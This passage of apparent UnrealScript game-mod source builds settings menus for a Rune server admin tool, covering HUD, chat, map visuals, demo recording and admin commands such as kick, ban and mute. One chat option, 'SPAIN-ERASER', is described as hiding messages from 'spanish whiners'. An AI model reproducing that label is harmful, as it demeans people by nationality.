                MenuCategories[X].Help[i] = "Alters radius";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "soundRadius";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Play sound";
                MenuCategories[X].Help[i] = "Plays your sound (clientside)";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "playmahsound";
                if(Owner.PlayerReplicationInfo.bAdmin)
                {
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Play sound (ADMIN)";
                    MenuCategories[X].Help[i] = "Plays your sound (serverside)";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "playmahsound2";
                }
            }
        }
        MenuCategories[X].count = i;
    }
    if(gI == 3)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "Show FPS";
        MenuCategories[X].Help[i] = "Display your fps. (frames per second)";
        MenuCategories[X].propertyName[i] = "bShowFPS";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Black background";
        MenuCategories[X].Help[i] = "Toggles the black background at the ESC Menu";
        MenuCategories[X].propertyName[i] = "showBlackBackground";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Sark HUD";
        MenuCategories[X].Help[i] = "Toggle the SarkRagnar HUD style from SP";
        MenuCategories[X].propertyName[i] = "bUseSarkHUD";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "HUD Scale";
        MenuCategories[X].Help[i] = "Alters your custom hud scale.";
        MenuCategories[X].propertyName[i] = "float";
        MenuCategories[X].Value[i] = "chudScale";
        MenuCategories[X].maxValue[i] = 5;
        MenuCategories[X].minValue[i] = 0;
        MenuCategories[X].stepValue[i] = 0.1000000;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Debug HUD";
        MenuCategories[X].Help[i] = "developing tool";
        MenuCategories[X].propertyName[i] = "bCAZDebug";
        MenuCategories[X].Value[i] = "/";
        if(bCAZDebug)
        {
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Debug category";
            MenuCategories[X].Help[i] = "switch through debug categories";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "cazDebugMode";
            MenuCategories[X].maxValue[i] = 6;
            MenuCategories[X].minValue[i] = 1;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Draw coadmin menu debug";
            MenuCategories[X].Help[i] = "debug coadmin menu";
            MenuCategories[X].propertyName[i] = "bCAZDebugMenu";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Draw rune menu debug";
            MenuCategories[X].Help[i] = "debugs uwindows";
            MenuCategories[X].propertyName[i] = "bCAZDebugUWindow";
            MenuCategories[X].Value[i] = "/";
        }
        if((INT_v6715 == 1) && !bQuickKeyEnable)
        {            
        }
        else
        {
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Menu Position Y";
            MenuCategories[X].Help[i] = "Customize vertical position of this menu";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "detailsModifier";
            MenuCategories[X].maxValue[i] = 1000;
            MenuCategories[X].minValue[i] = -1000;
            MenuCategories[X].stepValue[i] = 1.0000000;
        }
        MenuCategories[X].count = i;
    }
    if(gI == 4)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "Auto-clear";
        MenuCategories[X].Help[i] = "Toggles between auto-clear and keeping messages forever";
        MenuCategories[X].propertyName[i] = "deleteMessages";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Experimental position";
        MenuCategories[X].Help[i] = "Toggles between old and experimental new chat position";
        MenuCategories[X].propertyName[i] = "bNoCenter";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Message fading";
        MenuCategories[X].Help[i] = "Toggles message fading ( easier to read if disabled )";
        MenuCategories[X].propertyName[i] = "bFading";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Message beep";
        MenuCategories[X].Help[i] = "Toggles the message beep sound";
        MenuCategories[X].propertyName[i] = "bMessageBeep";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Show chat";
        MenuCategories[X].Help[i] = "Used to disable the chat in case you don't bother about it.";
        MenuCategories[X].propertyName[i] = "bCChat";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Chat log";
        MenuCategories[X].Help[i] = "Toggles clientside chat logging at Rune/Logs";
        MenuCategories[X].propertyName[i] = "bChatLog";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Chat lines";
        MenuCategories[X].Help[i] = "Customize amount of chat lines ( default: 4 )";
        MenuCategories[X].propertyName[i] = "int";
        MenuCategories[X].Value[i] = "cchatlines";
        MenuCategories[X].maxValue[i] = 32;
        MenuCategories[X].minValue[i] = 1;
        MenuCategories[X].stepValue[i] = 1.0000000;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Chat font";
        MenuCategories[X].Help[i] = "Customize the chat font, useful for large Screens / huge distance";
        MenuCategories[X].propertyName[i] = "int";
        MenuCategories[X].Value[i] = "chatFont";
        MenuCategories[X].controlStyle[i] = 1;
        MenuCategories[X].maxValue[i] = 11;
        MenuCategories[X].minValue[i] = 0;
        MenuCategories[X].stepValue[i] = 1.0000000;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "SPAIN-ERASER";
        MenuCategories[X].Help[i] = "Makes all messages from spanish whiners disappear *poof*";
        MenuCategories[X].propertyName[i] = "bIgnoreSpain";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Smart chat";
        MenuCategories[X].Help[i] = "Toggles smart chat ( auto-complete / suggestions / copy & paste )";
        MenuCategories[X].propertyName[i] = "bEnhancedChat";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Smart chat key";
        MenuCategories[X].Help[i] = "Used to change the key used to replace words with smartchat(default: shift)";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-smartKey ";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Smart ass";
        MenuCategories[X].Help[i] = "First letter capitalized, dot at end of sentence";
        MenuCategories[X].propertyName[i] = "smartass";
        MenuCategories[X].Value[i] = "/";
        MenuCategories[X].count = i;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Smart ass replacing";
        MenuCategories[X].Help[i] = "Toggles smartass word replacing ( needs smartass enabled )";
        MenuCategories[X].propertyName[i] = "smartasswords";
        MenuCategories[X].Value[i] = "/";
        MenuCategories[X].count = i;
    }
    if(gI == 5)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "Big killfeed";
        MenuCategories[X].Help[i] = "";
        MenuCategories[X].propertyName[i] = "bLargeFeed";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Feed lines";
        MenuCategories[X].Help[i] = "Customize amount of feed lines ( default: 4 )";
        MenuCategories[X].propertyName[i] = "int";
        MenuCategories[X].Value[i] = "KillFeedQueueSize";
        MenuCategories[X].maxValue[i] = 30;
        MenuCategories[X].minValue[i] = 4;
        MenuCategories[X].stepValue[i] = 1.0000000;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Lifetime in seconds";
        MenuCategories[X].Help[i] = "Customize lifetime in seconds ( default: 5 )";
        MenuCategories[X].propertyName[i] = "int";
        MenuCategories[X].Value[i] = "KillFeedTime";
        MenuCategories[X].maxValue[i] = 20;
        MenuCategories[X].minValue[i] = 3;
        MenuCategories[X].stepValue[i] = 1.0000000;
        MenuCategories[X].count = i;
    }
    if(gI == 6)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "Save settings";
        MenuCategories[X].Help[i] = "Enable it to save your settings for this map and they will be reloaded everytime the map is on";
        MenuCategories[X].propertyName[i] = "bLocalModify";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Kill Skybox";
        MenuCategories[X].Help[i] = "Enable this to disable the Skybox";
        MenuCategories[X].propertyName[i] = "bLocalDisableSkyBox";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Kill Fog";
        MenuCategories[X].Help[i] = "Enable this to disable the Fogzone";
        MenuCategories[X].propertyName[i] = "bLocalDisableFog";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Kill Ambientsound";
        MenuCategories[X].Help[i] = "Enable this to disable the Ambientsound (background music)";
        MenuCategories[X].propertyName[i] = "bLocalDisableAmbientSound";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Map theme";
        MenuCategories[X].Help[i] = "Select custom themes for the map.";
        MenuCategories[X].propertyName[i] = "int";
        MenuCategories[X].Value[i] = "localTextureOverlay";
        MenuCategories[X].controlStyle[i] = 1;
        MenuCategories[X].maxValue[i] = 19;
        MenuCategories[X].minValue[i] = 0;
        MenuCategories[X].stepValue[i] = 1.0000000;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Color correction";
        MenuCategories[X].Help[i] = "Select custom themes for the map.";
        MenuCategories[X].propertyName[i] = "bLocalColorCorrection";
        MenuCategories[X].Value[i] = "/";
        if(bLocalColorCorrection)
        {
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Color Correction Alpha";
            MenuCategories[X].Help[i] = "modify map color strength";
            MenuCategories[X].propertyName[i] = "float";
            MenuCategories[X].Value[i] = "blur_alpha";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].maxValue[i] = 1;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 0.0100000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Color Correction R";
            MenuCategories[X].Help[i] = "modify map color";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "blur_r";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Color Correction G";
            MenuCategories[X].Help[i] = "modify map color";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "blur_g";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Color Correction B";
            MenuCategories[X].Help[i] = "modify map color";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "blur_b";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 1.0000000;
        }
        MenuCategories[X].count = i;
    }
    if(gI == 7)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "Automatic demorec";
        MenuCategories[X].Help[i] = "Toggles automatic demo recording at each map";
        MenuCategories[X].propertyName[i] = "bAutoDemoRec";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        if(bAutoDemoRec)
        {
            MenuCategories[X].stcProperty[i] = "|   Auto demo restart";
            MenuCategories[X].Help[i] = "Restarts demo during the map";
            MenuCategories[X].propertyName[i] = "bAutoDemoRestart";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "|   Show demoname on-screen";
            MenuCategories[X].Help[i] = "";
            MenuCategories[X].propertyName[i] = "bAutoDemoDraw";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
        }
        MenuCategories[X].stcProperty[i] = "Date format";
        MenuCategories[X].Help[i] = "Allows you to switch between US/EU date format for the filename.";
        MenuCategories[X].propertyName[i] = "bSwitchDateFormat";
        MenuCategories[X].controlStyle[i] = 1;
        MenuCategories[X].Value[i] = "/";
        MenuCategories[X].count = i;
    }
    if(gI == 8)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "pBan ID";
        MenuCategories[X].Help[i] = "Ban player by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pBan";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pDefaultWeapon Weapon";
        MenuCategories[X].Help[i] = "Sets the weapon you select as temporary default weapon.";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pDefaultWeapon";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pFragLimit nr";
        MenuCategories[X].Help[i] = "Sets the FragLimit to selected number.";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pFragLimit";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pGamePass PW";
        MenuCategories[X].Help[i] = "Sets the server password.";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pGamePass";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pKick ID";
        MenuCategories[X].Help[i] = "Kick player by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pKick";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pKill ID";
        MenuCategories[X].Help[i] = "Kill player by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pKill";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pKillAll";
        MenuCategories[X].Help[i] = "Kill all players and make them respawn";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "*pKillAll";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pMake ID stuff";
        MenuCategories[X].Help[i] = "Apply stuff to ID ( GHOST/FLY/GOD/HEAL/POWER )";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pMake";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pMap Name";
        MenuCategories[X].Help[i] = "Change map to selected one (AR/CTT/DM/TDM-Map)";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pMap";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pMapList";
        MenuCategories[X].Help[i] = "Outputs the current mapcycle.";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "*pMapList";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pMeto ID";
        MenuCategories[X].Help[i] = "Teleports you to player ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pMeto";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pMute ID";
        MenuCategories[X].Help[i] = "Mute player by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pMute";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pName ID newname";
        MenuCategories[X].Help[i] = "Change player name by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pName";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pNameLock ID";
        MenuCategories[X].Help[i] = "Lock players name by ID ( so it cant be changed )";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pNameLock";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pNextMap";
        MenuCategories[X].Help[i] = "Skip the current map and start the next one in cycle.";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pNextMap";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pPink";
        MenuCategories[X].Help[i] = "Toggle protection of team pink";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "*pPink";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pRestart";
        MenuCategories[X].Help[i] = "Restart current map.";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pRestart";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pStop ID";
        MenuCategories[X].Help[i] = "Freeze player by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pStop";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pTBan ID";
        MenuCategories[X].Help[i] = "Map-ban player by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pTBan";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pTell ID msg";
        MenuCategories[X].Help[i] = "Whipser a private message by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pTell";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pTimeLimit nr";
        MenuCategories[X].Help[i] = "Change timelimit to xx minutes";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pTimeLimit";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "pTome ID";
        MenuCategories[X].Help[i] = "Teleport player to you by ID";
        MenuCategories[X].propertyName[i] = "command";
        MenuCategories[X].Value[i] = "-pTome";
        MenuCategories[X].count = i;
    }
    if(gI == 9)
    {
        if(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Local_int_v2 != 1337)
        {
            i = 0;
            MenuCategories[X].stcProperty[i] = "<-";
            MenuCategories[X].propertyName[i] = "";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Login as master-admin";
            MenuCategories[X].Help[i] = "You need to be logged in as master-admin in CoAdminZ";
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "-pLogin ";
            MenuCategories[X].count = i;            
        }
        else
        {
            i = 0;
            MenuCategories[X].stcProperty[i] = "<-";
            MenuCategories[X].propertyName[i] = "";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Gap size";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "GSize";
            MenuCategories[X].maxValue[i] = 100;
            MenuCategories[X].minValue[i] = -100;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Gap size to scoreboard";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "GSizeS";
            MenuCategories[X].maxValue[i] = 100;
            MenuCategories[X].minValue[i] = -100;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Gap motd";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "GSizeM";
            MenuCategories[X].maxValue[i] = 100;
            MenuCategories[X].minValue[i] = -100;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Servername Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "scolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Servername Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "scolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Servername Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "scolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Header Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "hcolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Header Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "hcolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Header Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "hcolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Table Header Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "thcolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Table Header Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "thcolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Table Header Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "thcolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Seperator Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "sepcolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Seperator Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "sepcolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Seperator Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "sepcolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Title Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "tcolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Title Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "tcolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Title Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "tcolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Admin Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "acolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Admin Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "acolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Admin Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "acolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Email Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "ecolorr";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Email Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "ecolorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Email Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "ecolorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD1 Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m1colorR";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD1 Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m1colorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD1 Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m1colorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD2 Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m2colorR";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD2 Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m2colorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD2 Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m2colorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD3 Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m3colorR";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD3 Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m3colorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD3 Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m3colorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD4 Color R";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m4colorR";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD4 Color G";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m4colorG";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "MOTD4 Color B";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "m4colorB";
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Send settings to server";
            MenuCategories[X].Help[i] = "Sends your customized settings to the server and applies it to all players.";
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "sendSettings";
            MenuCategories[X].count = i;
        }
    }
    if(gI == 10)
    {
        i = 0;
        if(!Owner.PlayerReplicationInfo.bAdmin)
        {
            MenuCategories[X].stcProperty[i] = "<-";
            MenuCategories[X].propertyName[i] = "";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Login as admin";
